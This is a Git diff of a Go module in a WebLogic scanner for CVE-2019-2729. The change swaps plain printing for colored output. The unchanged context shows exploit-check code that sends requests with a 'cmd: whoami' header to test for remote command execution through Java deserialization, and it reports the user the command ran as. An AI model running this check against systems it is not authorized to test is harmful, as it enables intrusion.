@@ -2,7 +2,7 @@ package CVE_2019_2729
 
 import (
 	"WeblogicScan/config"
-	"fmt"
+	"github.com/gookit/color"
 	"io/ioutil"
 	"net/http"
 	"strings"
@@ -3543,19 +3543,19 @@ func Run(u string, port string) {
 	request1.Header.Set("Content-Type", "text/xml")
 	request1.Header.Set("cmd", "whoami")
 	if err != nil {
-		fmt.Printf("[-] Target weblogic not detected %s\n", VUL)
+		color.Red.Printf("[-] Target weblogic not detected %s\n", VUL)
 		return
 	}
 	response1, err := client.Do(request1)
 	if err != nil {
-		fmt.Printf("[-] Target weblogic not detected %s\n", VUL)
+		color.Red.Printf("[-] Target weblogic not detected %s\n", VUL)
 		return
 	}
 	defer response1.Body.Close()
 
 	body1, err := ioutil.ReadAll(response1.Body)
 	if err != nil {
-		fmt.Printf("[-] Target weblogic not detected %s\n", VUL)
+		color.Red.Printf("[-] Target weblogic not detected %s\n", VUL)
 		return
 	}
 
@@ -3566,12 +3566,12 @@ func Run(u string, port string) {
 	request2.Header.Set("Content-Type", "text/xml")
 	request2.Header.Set("cmd", "whoami")
 	if err != nil {
-		fmt.Printf("[-] Target weblogic not detected %s\n", VUL)
+		color.Red.Printf("[-] Target weblogic not detected %s\n", VUL)
 		return
 	}
 	response2, err := client.Do(request2)
 	if err != nil {
-		fmt.Printf("[-] Target weblogic not detected %s\n", VUL)
+		color.Red.Printf("[-] Target weblogic not detected %s\n", VUL)
 		return
 	}
 	defer response2.Body.Close()
@@ -3586,22 +3586,22 @@ func Run(u string, port string) {
 
 	request3, err := http.Get(url + "/_async/favicon.ico")
 	if err != nil {
-		fmt.Printf("[-] Target weblogic not detected %s\n", VUL)
+		color.Red.Printf("[-] Target weblogic not detected %s\n", VUL)
 		return
 	}
 	defer request3.Body.Close()
 
 	body3, err := ioutil.ReadAll(request3.Body)
 	if err != nil {
-		fmt.Printf("[-] Target weblogic not detected %s\n", VUL)
+		color.Red.Printf("[-] Target weblogic not detected %s\n", VUL)
 		return
 	}
 
 	if (response1.StatusCode == 200) && (strings.Contains(string(body1), "uid")) || ((response2.StatusCode == 202) && strings.Contains(string(body3), "Vulnerable")) {
-		fmt.Printf("[+] The target weblogic has a JAVA deserialization vulnerability: %s\n", VUL)
-		fmt.Printf("[+] Your current permission is:  %s\n", strings.Replace(string(body1), "whoami : \r\n", "", -1))
+		color.Green.Printf("[+] The target weblogic has a JAVA deserialization vulnerability: %s\n", VUL)
+		color.Green.Printf("[+] Your current permission is:  %s\n", strings.Replace(string(body1), "whoami : \r\n", "", -1))
 	} else {
-		fmt.Printf("[-] Target weblogic not detected %s\n", VUL)
+		color.Red.Printf("[-] Target weblogic not detected %s\n", VUL)
 	}
 
 }
